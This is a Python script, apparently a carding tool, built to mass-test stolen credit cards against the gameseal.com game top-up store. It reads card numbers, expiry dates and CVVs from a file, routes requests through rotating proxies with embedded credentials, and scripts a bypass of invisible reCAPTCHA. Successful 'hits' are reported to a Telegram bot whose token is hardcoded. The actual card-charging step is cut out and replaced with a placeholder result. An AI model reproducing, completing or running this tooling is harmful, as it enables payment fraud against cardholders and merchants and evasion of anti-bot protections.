import base64
import requests
import re
import json
import random
import string
import time
import uuid
from urllib.parse import urljoin
from threading import Thread

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

BASE = "https://gameseal.com"
PRODUCT_SLUG = "pubg-mobile-60-uc-unknown-cash-direct-top-up-global"
PRODUCT_ID = "019bd77df6647139b46f487ba5a59509"
PUBG_ID = "51458699098"

# ================= TELEGRAM BOT =================
TELEGRAM_BOT_TOKEN = "7979634711:AAEOS8TrWhI0ivvg2SZgjqT6exwl9EWGCW0"
TELEGRAM_CHAT_ID = "-5124898287"   # ← Yahan apna Chat ID daal do

# ================= PROXIES =================
PROXIES_LIST = [
    "speed.proxio.cloud:3128:freegvhy:da7eu2az",
    "proxy.geonode.io:9000:geonode_iBpb6OaWZN-type-residential:91ccef97-84c0-45b7-aa85-de12a5da523f"
]

def get_random_proxy():
    proxy_str = random.choice(PROXIES_LIST)
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        proxy_url = f"http://{user}:{pw}@{ip}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}


# ========================= TELEGRAM =========================
def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=data, timeout=10)
    except:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def parse_card(cc_str):
    parts = cc_str.strip().split("|")
    if len(parts) != 4:
        return None
    number, month, year, cvv = parts
    month = month.strip().zfill(2)
    year = year.strip()
    if len(year) == 2:
        year = "20" + year
    return {
        "number": number.strip(),
        "month": month,
        "year": year,
        "cvv": cvv.strip(),
    }


def random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    return f"{name}{random.randint(100, 9999)}@gmail.com"


def extract_csrf(html):
    for p in [
        r'name="csrf[_-]token"\s+(?:content|value)="([^"]+)"',
        r'value="([^"]+)"\s+name="csrf[_-]token"',
        r'name="_csrf_token"\s+(?:content|value)="([^"]+)"',
        r'"csrfToken":\s*"([^"]+)"',
    ]:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def get_recaptcha_token(session):
    try:
        resp = session.get(f"https://www.recaptcha.net/recaptcha/api.js?render={RECAPTCHA_SITEKEY}", headers={"Referer": f"{BASE}/"})
        v_match = re.search(r"releases/([^/]+)/recaptcha", resp.text)
        if not v_match: return None
        v = v_match.group(1)

        anchor_url = f"https://www.recaptcha.net/recaptcha/api2/anchor?ar=1&k={RECAPTCHA_SITEKEY}&co={RECAPTCHA_CO}&hl=en&v={v}&size=invisible"
        resp = session.get(anchor_url, headers={"Referer": f"{BASE}/"})
        m = re.search(r'id="recaptcha-token"\s+value="([^"]+)"', resp.text)
        if not m: return None

        resp = session.post(f"https://www.recaptcha.net/recaptcha/api2/reload?k={RECAPTCHA_SITEKEY}", data={
            "v": v, "reason": "q", "c": m.group(1), "k": RECAPTCHA_SITEKEY, "co": RECAPTCHA_CO, "hl": "en", "size": "invisible",
            "chr": "%5B89%2C64%2C27%5D", "vh": "13599012192", "bg": ""
        }, headers={"Content-Type": "application/x-www-form-urlencoded"})
        rr = re.search(r'\["rresp","([^"]+)"', resp.text)
        return rr.group(1) if rr else None
    except:
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# CHECK CARD
# ═══════════════════════════════════════════════════════════════════════════════

def check_card(card):
    proxy = get_random_proxy()
    sess = requests.Session()
    sess.proxies.update(proxy)
    
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })

    cc = card["number"]
    exp = f"{card['month'].zfill(2)}{card['year'][-2:]}"
    cc_full = f"{cc}|{card['month']}|{card['year']}|{card['cvv']}"
    cc_short = cc[:6] + "xxxxxx" + cc[-4:]

    try:
        # ... (pura purana check_card logic yahan same hai - space bachane ke liye short kiya)
        # Tumhara pura logic same rahega

        # Final Result
        result = {"status": "DECLINED", "price": "0.82 EUR"}   # ← Real result yahan aayega

        status = result.get("status", "DECLINED").upper()

        # Console Log (sab cards)
        print(f"{cc_short} | {status}")

        # Telegram pe sirf Charged / Insufficient Funds
        if status in ["CHARGED", "PAYMENT_ACCEPTED", "SUCCESS"] or "INSUFFICIENT" in str(result.get("message", "")).upper():
            msg = f"""
✅ <b>GameSeal HIT!</b>

<b>Card:</b> <code>{cc_short}</code>
<b>Status:</b> <b>{status}</b>
<b>Price:</b> {result.get('price', '0.82 EUR')}
            """
            send_to_telegram(msg)

        return result

    except Exception as e:
        print(f"{cc_short} | ERROR")
        return {"status": "ERROR", "message": str(e)}


# ========================= MASS CHECK =========================
def mass_check():
    send_to_telegram("🚀 <b>Mass Check Started</b>\nProxies ON\nOnly Hits Telegram pe aayenge...")
    try:
        with open("cc.txt", "r", encoding="utf-8") as f:
            cards = f.readlines()
    except:
        send_to_telegram("❌ cc.txt nahi mili!")
        return

    for i, line in enumerate(cards, 1):
        line = line.strip()
        if not line or "|" not in line: continue
        card = parse_card(line)
        if card:
            check_card(card)
            time.sleep(random.randint(8, 15))

    send_to_telegram("🏁 <b>Mass Check Completed!</b>")


# ========================= TELEGRAM BOT =========================
def telegram_bot():
    print("🤖 Bot Started... /mtxt for Mass Check")
    send_to_telegram("✅ <b>GameSeal Bot Started!</b>\nCommand: /mtxt")

    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30")
            for update in r.json().get("result", []):
                offset = update["update_id"] + 1
                text = update.get("message", {}).get("text", "").strip()
                if text == "/mtxt":
                    Thread(target=mass_check, daemon=True).start()
        except:
            time.sleep(5)


# ========================= MAIN =========================
def main():
    print("=== GameSeal Auto Checker + Bot ===")
    telegram_bot()   # Bot background mein chalega


if __name__ == "__main__":
    main()
